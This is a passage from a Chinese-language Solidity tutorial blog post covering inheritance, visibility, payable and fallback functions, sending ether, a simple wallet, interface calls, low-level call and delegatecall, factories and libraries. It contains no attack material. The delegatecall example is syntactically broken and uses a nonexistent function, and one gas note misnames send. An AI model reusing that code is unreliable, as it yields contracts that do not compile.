class="keyword">return</span> <span class="string">&quot;C&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">hip</span><span class="params">()</span>public pure <span class="title function_">override</span> <span class="params">(A,B)</span><span class="title function_">returns</span><span class="params">(<span class="built_in">string</span> memory)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;C&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="继承构造函数传入参数的知识"><a href="#继承构造函数传入参数的知识" class="headerlink" title="继承构造函数传入参数的知识"></a>继承构造函数传入参数的知识</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">contract S&#123;</span><br><span class="line">    <span class="built_in">string</span> public name;</span><br><span class="line">    constructor(<span class="built_in">string</span> memory _name)&#123;</span><br><span class="line">        name=_name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">contract T&#123;</span><br><span class="line">    <span class="built_in">string</span> public text;</span><br><span class="line">    constructor(<span class="built_in">string</span> memory _text)&#123;</span><br><span class="line">        text=_text;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">contract U is <span class="title function_">S</span><span class="params">(<span class="string">&quot;S&quot;</span>)</span>,<span class="title function_">T</span><span class="params">(<span class="string">&quot;t&quot;</span>)</span>&#123;<span class="comment">//已知输入内容</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">contract V is S ,T&#123;<span class="comment">//按照继承的顺序来运行，所以先传入S，后传入T</span></span><br><span class="line">    constructor(<span class="built_in">string</span> memory _name,<span class="built_in">string</span> memory _text )S(_name) T(_text)&#123;</span><br><span class="line"></span><br><span class="line">    &#125; </span><br><span class="line">&#125;<span class="comment">//构造函数时传入 当然U和V这两种方法是可以合并的</span></span><br></pre></td></tr></table></figure><h2 id="如何调用父级合约"><a href="#如何调用父级合约" class="headerlink" title="如何调用父级合约"></a>如何调用父级合约</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">contract E&#123;</span><br><span class="line">    event <span class="title function_">Log</span><span class="params">(<span class="built_in">string</span> msesage)</span>;</span><br><span class="line">    function <span class="title function_">foo</span><span class="params">()</span>public virtual&#123;</span><br><span class="line">        emit <span class="title function_">Log</span><span class="params">(<span class="string">&quot;E.foo&quot;</span>)</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">bar</span><span class="params">()</span>public virtual &#123;</span><br><span class="line">        emit <span class="title function_">Log</span><span class="params">(<span class="string">&quot;E.bar&quot;</span>)</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">contract F is E&#123;</span><br><span class="line">    function <span class="title function_">foo</span><span class="params">()</span>public virtual override&#123;</span><br><span class="line">        emit <span class="title function_">Log</span><span class="params">(<span class="string">&quot;F.foo&quot;</span>)</span>;</span><br><span class="line">        E.foo();<span class="comment">//直接调用v</span></span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">bar</span> <span class="params">()</span>public virtual override&#123;</span><br><span class="line">        emit <span class="title function_">Log</span><span class="params">(<span class="string">&quot;F.bar&quot;</span>)</span>;</span><br><span class="line">        super.bar();<span class="comment">//super方法调用，自己会寻找父级合约</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">contract G is E&#123;</span><br><span class="line">    function <span class="title function_">foo</span><span class="params">()</span>public virtual override&#123;</span><br><span class="line">        emit <span class="title function_">Log</span><span class="params">(<span class="string">&quot;G.foo&quot;</span>)</span>;</span><br><span class="line">        E.foo();</span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">bar</span><span class="params">()</span>public virtual override&#123;</span><br><span class="line">        emit <span class="title function_">Log</span><span class="params">(<span class="string">&quot;G.bar&quot;</span>)</span>;</span><br><span class="line">        super.bar();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">contract H is F, G&#123;</span><br><span class="line">    function <span class="title function_">foo</span><span class="params">()</span>public <span class="title function_">override</span><span class="params">(F,G)</span>&#123;</span><br><span class="line">        F.foo();<span class="comment">//直接调用</span></span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">bar</span> <span class="params">()</span>public <span class="title function_">override</span><span class="params">(F,G)</span>&#123;</span><br><span class="line">        super.bar();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="可视范围知识点"><a href="#可视范围知识点" class="headerlink" title="可视范围知识点"></a>可视范围知识点</h2><p>-private  只能合约内部可见<br>-internal 只能内部或者被继承的子合约中可见<br>-public  内外部均可见<br>-external 只能从外部可见，继承子合约中不可见</p><p>1.如果有一个外部合约C调用一个合约A，那么C合约只能看到A合约的public与external合约函数，其他都不行<br>2.继承只能看到internal和public<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">contract visibility&#123;</span><br><span class="line">    uint private x=<span class="number">0</span>;</span><br><span class="line">    uint internal y=<span class="number">1</span>;</span><br><span class="line">    uint public z=<span class="number">2</span>;</span><br><span class="line">    function <span class="title function_">privateFunc</span><span class="params">()</span>private pure <span class="title function_">returns</span><span class="params">(uint)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">internalFunc</span><span class="params">()</span>internal pure <span class="title function_">returns</span><span class="params">(uint)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">100</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">publicFunc</span><span class="params">()</span>public pure <span class="title function_">returns</span><span class="params">(uint)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">200</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">externalFunc</span><span class="params">()</span>external pure <span class="title function_">returns</span><span class="params">(uint)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">300</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">examples</span><span class="params">()</span>external view&#123;</span><br><span class="line">        x+y+z;</span><br><span class="line">        privateFunc();</span><br><span class="line">        internalFunc();</span><br><span class="line">        publicFunc();</span><br><span class="line">        this.externalFunc();<span class="comment">//可以通过这样来访问外部函数。原理:先到合约外部在到内部从而访问external函数。</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="不可变量"><a href="#不可变量" class="headerlink" title="不可变量"></a>不可变量</h2><p>不可变量immutable用的时候必须赋值<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">contract Immutable&#123;</span><br><span class="line">    address public immutable owner = msg.sender;<span class="comment">//像定义常量一样节约gas费，同样owner永不可变</span></span><br><span class="line">   <span class="comment">// constructor()&#123;</span></span><br><span class="line">    <span class="comment">//    owner=msg.sender;可在构建函数时赋值 </span></span><br><span class="line">    <span class="comment">//&#125;</span></span><br><span class="line">    uint public x;</span><br><span class="line">    function <span class="title function_">foo</span><span class="params">()</span>external&#123;</span><br><span class="line">        require (msg.sender == owner);</span><br><span class="line">        x+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="支付payable属性与回退函数运用"><a href="#支付payable属性与回退函数运用" class="headerlink" title="支付payable属性与回退函数运用"></a>支付payable属性与回退函数运用</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">contract Payable&#123;</span><br><span class="line">    address payable public owner;<span class="comment">//这样的话就可以发送钱了</span></span><br><span class="line">    constructor()&#123;</span><br><span class="line">        owner =payable(msg.sender);</span><br><span class="line">        <span class="comment">//owner=msg.sender ;这样不行    //因为owner有payable的属性，所以构造函数要有payable的属性</span></span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">deposit</span><span class="params">()</span>external payable&#123;&#125;</span><br><span class="line">    function <span class="title function_">getBalance</span><span class="params">()</span>external view <span class="title function_">returns</span><span class="params">(uint)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> address(this).balance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//回退函数</span></span><br><span class="line"></span><br><span class="line">contract Fallback&#123;<span class="comment">//有数据则会触发fallback</span></span><br><span class="line">    event <span class="title function_">Log</span><span class="params">(<span class="built_in">string</span> func,address sender,uint value,bytes  data)</span>;</span><br><span class="line">    fallback()external payable&#123;<span class="comment">//可接受主币的发送</span></span><br><span class="line">        emit <span class="title function_">Log</span><span class="params">(<span class="string">&quot;fallback&quot;</span>,msg.sender,msg.value,msg.data)</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    receive()external payable&#123;<span class="comment">//无数据则会触发receive，如果没有receive则会触发fallback</span></span><br><span class="line">        emit <span class="title function_">Log</span><span class="params">(<span class="string">&quot;receive&quot;</span>,msg.sender,msg.value,<span class="string">&quot;&quot;</span>)</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="发送以太币三种方法"><a href="#发送以太币三种方法" class="headerlink" title="发送以太币三种方法"></a>发送以太币三种方法</h2><p>· transfer 2300 gas,reverts<br>· sender -2300 gas returns  bool<br>· call - all gas,returns bool and data<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">contract SendEther&#123;</span><br><span class="line">    constructor()payable&#123;&#125;</span><br><span class="line">    receive()external payable&#123;&#125;</span><br><span class="line">    function <span class="title function_">sendtrsndfer</span><span class="params">(address payable _to)</span>external payable&#123;</span><br><span class="line">        _to.transfer(<span class="number">123</span>);<span class="comment">//代表123wei</span></span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">sendsend</span><span class="params">(address payable _to)</span>external payable&#123;</span><br><span class="line">        <span class="type">bool</span> send=_to.send(<span class="number">123</span>);</span><br><span class="line">        require(send,<span class="string">&quot;send failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">sendcall</span><span class="params">(address payable _to)</span>external payable&#123;</span><br><span class="line">        (<span class="type">bool</span> success,)=_to.call&#123;value:<span class="number">123</span>&#125;(<span class="string">&quot;&quot;</span>);</span><br><span class="line">        require(success,<span class="string">&quot;fail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="制作一个以太坊钱包"><a href="#制作一个以太坊钱包" class="headerlink" title="制作一个以太坊钱包"></a>制作一个以太坊钱包</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">contract EtherWallet&#123;</span><br><span class="line">    address payable public  owner;</span><br><span class="line">    constructor()&#123;</span><br><span class="line">        owner=payable(msg.sender);</span><br><span class="line">    &#125;</span><br><span class="line">    receive()external payable&#123;&#125;</span><br><span class="line">    function <span class="title function_">withdraw</span><span class="params">(uint _amount)</span>external&#123;</span><br><span class="line">        require(msg.sender==owner,<span class="string">&quot;caller is not owner&quot;</span>);</span><br><span class="line">        owner.transfer(_amount);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="通过一个合约地址调用另一个合约"><a href="#通过一个合约地址调用另一个合约" class="headerlink" title="通过一个合约地址调用另一个合约"></a>通过一个合约地址调用另一个合约</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">contract callTestContract&#123;</span><br><span class="line">    function <span class="title function_">setx1</span><span class="params">(address _test,uint _x)</span>external&#123;</span><br><span class="line">        TestContract(_test).setx(_x);</span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">setx2</span><span class="params">(TestContract _test,uint _x)</span>external&#123;</span><br><span class="line">        _test.setx(_x);<span class="comment">//两种方法都可以</span></span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">getx</span><span class="params">(address _test)</span>external view <span class="title function_">returns</span><span class="params">(uint)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> TestContract(_test).getx();</span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">setxandReceiveEther</span><span class="params">(address _test,uint _x)</span>external payable&#123;</span><br><span class="line">        TestContract(_test).setxandReceiveEther&#123;value:msg.value&#125;(_x);<span class="comment">//传入value的值</span></span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">getxandValue</span><span class="params">(address _test)</span>external view <span class="title function_">returns</span><span class="params">(uint x,uint value)</span>&#123;</span><br><span class="line">        (x,value)=TestContract(_test).getxandValue();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">contract TestContract&#123;</span><br><span class="line">    uint public x;</span><br><span class="line">    uint public value=<span class="number">123</span>;</span><br><span class="line">    function <span class="title function_">setx</span><span class="params">(uint _x)</span>external&#123;</span><br><span class="line">        x=_x;</span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">getx</span><span class="params">()</span>external view <span class="title function_">returns</span><span class="params">(uint)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> x;</span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">setxandReceiveEther</span><span class="params">(uint _x)</span>external payable&#123;</span><br><span class="line">        x=_x;</span><br><span class="line">        value=msg.value;</span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">getxandValue</span><span class="params">()</span>external view <span class="title function_">returns</span><span class="params">(uint, uint)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> (x,value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="接口"><a href="#接口" class="headerlink" title="接口"></a>接口</h2><p>当不知到一个合约源代码时可以用接口合约调用其中的函数<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">interface ICounter&#123;</span><br><span class="line">    function <span class="title function_">count</span><span class="params">()</span>external view <span class="title function_">returns</span><span class="params">(uint)</span>;</span><br><span class="line">    function <span class="title function_">inc</span><span class="params">()</span>external;</span><br><span class="line">&#125;</span><br><span class="line">contract CallInterface&#123;</span><br><span class="line">    uint public count;</span><br><span class="line">    function <span class="title function_">examples</span><span class="params">(address _counter)</span>external&#123;</span><br><span class="line">        ICounter(_counter).inc();</span><br><span class="line">        count=ICounter(_counter).count();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//假如不知道Counter合约的源代码</span></span><br><span class="line">contract Counter&#123;</span><br><span class="line">    uint public count;</span><br><span class="line">    function <span class="title function_">inc</span><span class="params">()</span>external&#123;</span><br><span class="line">        count+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">dec</span><span class="params">()</span>external&#123;</span><br><span class="line">        count -=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure></p><h2 id="低级调用call-函数签名"><a href="#低级调用call-函数签名" class="headerlink" title="低级调用call(函数签名)"></a>低级调用call(函数签名)</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">contract TestCall&#123;</span><br><span class="line">    <span class="built_in">string</span> public message;</span><br><span class="line">    uint public x;</span><br><span class="line">    event <span class="title function_">Log</span><span class="params">(<span class="built_in">string</span> message)</span>;</span><br><span class="line">    fallback()external payable&#123;</span><br><span class="line">        emit <span class="title function_">Log</span><span class="params">(<span class="string">&quot;fallback was called&quot;</span>)</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">foo</span><span class="params">(<span class="built_in">string</span> memory _message,uint _x)</span>external payable <span class="title function_">returns</span><span class="params">(<span class="type">bool</span>,uint)</span>&#123;</span><br><span class="line">        message=_message;</span><br><span class="line">        x=_x;</span><br><span class="line">        <span class="keyword">return</span>(<span class="literal">true</span>,<span class="number">999</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">contract Call&#123;<span class="comment">//用call调用合约中的函数</span></span><br><span class="line">    bytes public data;</span><br><span class="line">    function <span class="title function_">callFoo</span><span class="params">(address _test)</span>external payable&#123;</span><br><span class="line">        (<span class="type">bool</span> success,bytes memory _data)=_test.call&#123;value:<span class="number">111</span>&#125;(abi.encodeWithSignature(</span><br><span class="line">            <span class="string">&quot;foo(string,uint256)&quot;</span>,<span class="string">&quot;call foo&quot;</span>,<span class="number">123</span><span class="comment">//需要调用时转钱就加&#123;value:111&#125;(其中可规定gas用量)，否则不加</span></span><br><span class="line">        ));</span><br><span class="line">        require(success,<span class="string">&quot;call failed&quot;</span>);</span><br><span class="line">        data=_data;</span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">callNO</span><span class="params">(address _test)</span>external&#123;</span><br><span class="line">        (<span class="type">bool</span> success,)= _test.call(abi.encodeWithSignature(</span><br><span class="line">            <span class="string">&quot;doesnotexist()&quot;</span></span><br><span class="line">        ));</span><br><span class="line">        require(success,<span class="string">&quot;call failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="委托调用"><a href="#委托调用" class="headerlink" title="委托调用"></a>委托调用</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">1.直接调用发生的变化</span></span><br><span class="line"><span class="comment">A calls B,sends 100 wei </span></span><br><span class="line"><span class="comment">        B calls C,sends 50wei</span></span><br><span class="line"><span class="comment">A ---&gt;B ---&gt;C</span></span><br><span class="line"><span class="comment">            msg.sender=B</span></span><br><span class="line"><span class="comment">            msg.value=50</span></span><br><span class="line"><span class="comment">            execute code on C state variables</span></span><br><span class="line"><span class="comment">            use ETH in C</span></span><br><span class="line"><span class="comment">2.委托调用发生的变化</span></span><br><span class="line"><span class="comment">A calls B,sends 100 wei</span></span><br><span class="line"><span class="comment">        Bdelegatecall C</span></span><br><span class="line"><span class="comment">A---&gt;B---&gt;C</span></span><br><span class="line"><span class="comment">            msg.sender=A</span></span><br><span class="line"><span class="comment">            msg.value=100</span></span><br><span class="line"><span class="comment">            execute code on B state variables</span></span><br><span class="line"><span class="comment">            use ETH in B</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">contract TestDelegatecall&#123;<span class="comment">//测试合约</span></span><br><span class="line">    uint public num;</span><br><span class="line">    address public sender;</span><br><span class="line">    uint public value;</span><br><span class="line">    function <span class="title function_">setVars</span><span class="params">(uint _num)</span>external payable&#123;</span><br><span class="line">        num=_num;</span><br><span class="line">        sender=msg.sender;</span><br><span class="line">        value=msg.value;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//委托调用合约,只改变委托合约的变量，不改变测试合约变量，通过测试合约改变了委托合约中的状态变量</span></span><br><span class="line">contract DelegateCall&#123;</span><br><span class="line">    uint public num;</span><br><span class="line">    address public sender;</span><br><span class="line">    uint public value;</span><br><span class="line">    function <span class="title function_">setVars</span><span class="params">(address _test,uint _num)</span>external payable&#123;</span><br><span class="line">        <span class="comment">// _test.delegatecall(</span></span><br><span class="line">        <span class="comment">//     abi.encodeWithSignature(&quot;setVars(uint256)&quot;,_num)</span></span><br><span class="line">        <span class="comment">//     );</span></span><br><span class="line">        _test.delegatecall(</span><br><span class="line">           (<span class="type">bool</span> success ,bytes memory data)= abi.encodeWithSelect(TestDelegatecall.setVars.selector ,_num)</span><br><span class="line">        );</span><br><span class="line">        require(success.<span class="string">&quot;delegatecall failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="用new来创建合约"><a href="#用new来创建合约" class="headerlink" title="用new来创建合约"></a>用new来创建合约</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">contract Account&#123;</span><br><span class="line">    address public bank;</span><br><span class="line">    address public owner;</span><br><span class="line">    constructor(address _owner)payable&#123;</span><br><span class="line">        bank=msg.sender;</span><br><span class="line">        owner=_owner;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">contract AccountFactory&#123;</span><br><span class="line">    Account[]public accounts;</span><br><span class="line">    function <span class="title function_">createAccount</span><span class="params">(address _owner)</span>external payable&#123;</span><br><span class="line">        Account account=new Account&#123;value:<span class="number">111</span>&#125;(_owner);<span class="comment">//创建合约</span></span><br><span class="line">        accounts.push(account);<span class="comment">//将合约添入数组</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="库合约-library"><a href="#库合约-library" class="headerlink" title="库合约(library)"></a>库合约(library)</h2><p><strong>库合约就是自定义函数用来防止重复代码</strong><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">library Math&#123;</span><br><span class="line">    function <span class="title function_">max</span><span class="params">(uint x,uint y)</span>internal pure <span class="title function_">returns</span><span class="params">(uint)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> x&gt;=y?x:y;</span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">find</span><span class="params">(uint []storage arr,uint x)</span>internal view <span class="title function_">returns</span><span class="params">(uint)</span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(uint i=<span class="number">0</span>;i&lt;arr.length;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(arr[i]==x)&#123;</span><br><span class="line">                <span class="keyword">return</span> i;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        revert(<span class="string">&quot;not found&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">contract Test&#123;</span><br><span class="line">    function <span class="title function_">testMax</span><span class="params">(uint x,uint y)</span>external pure <span class="title function_">returns</span><span class="params">(uint)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> Math.max(x,y);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">contract TestArray&#123;</span><br><span class="line">    using Math <span class="keyword">for</span> uint[];<span class="comment">//相当于我们把库运用到数组这个类型</span></span><br><span class="line">                           <span class="comment">//这个类型就拥有了这个库的所有函数的功能</span></span><br><span class="line">    uint []public arr=[<span class="number">3</span>,<span class="number">2</span>,<span class="number">1</span>];</span><br><span class="line">    function <span class="title function_">testFind</span><span class="params">()</span>external view <span class="title function_">returns</span><span class="params">(uint i)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> Math.find(arr,<span class="number">2</span>);<span class="comment">//没有用using的方法</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="哈希算法"><a href="#哈希算法" class="headerlink" title="哈希算法"></a>哈希算法</h2><p><strong>用于签名获取特定的id</strong><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span 